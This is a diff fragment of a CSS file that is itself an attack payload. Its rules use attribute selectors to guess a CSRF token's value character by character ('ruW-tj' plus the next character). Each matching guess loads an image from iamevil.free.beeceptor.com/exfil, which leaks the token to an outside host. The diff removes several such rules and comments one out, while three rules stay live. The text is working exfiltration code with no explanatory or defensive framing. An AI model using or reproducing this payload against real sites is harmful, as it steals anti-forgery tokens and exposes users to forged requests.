@@ -79,19 +79,5 @@ input[name^="csrf"][value^="ruW-tj="] { background-image: url("https://iamevil.f
 input[name^="csrf"][value^="ruW-tj~"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj~"); }
 input[name^="csrf"][value^="ruW-tj;"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj;"); }
 
-input[name^="csrf"][value^="ruW-tj{"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj{"); }
-input[name^="csrf"][value^="ruW-tj}"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj}"); }
-input[name^="csrf"][value^="ruW-tj|"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj|"); }
-input[name^="csrf"][value^="ruW-tj\\"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj\\"); }
-
-input[name^="csrf"][value^="ruW-tj/"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj/"); }
-input[name^="csrf"][value^="ruW-tj?"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj?"); }
-input[name^="csrf"][value^="ruW-tj<"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj<"); }
-input[name^="csrf"][value^="ruW-tj>"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj>"); }
-
-input[name^="csrf"][value^="ruW-tj["] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj["); }
-input[name^="csrf"][value^="ruW-tj]"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj]"); }
-input[name^="csrf"][value^="ruW-tj'"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj'"); }
-
-input[name^="csrf"][value^="ruW-tj"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj"); }
+/*input[name^="csrf"][value^="ruW-tj"] { background-image: url("https://iamevil.free.beeceptor.com/exfil?char=ruW-tj"); }*/
 
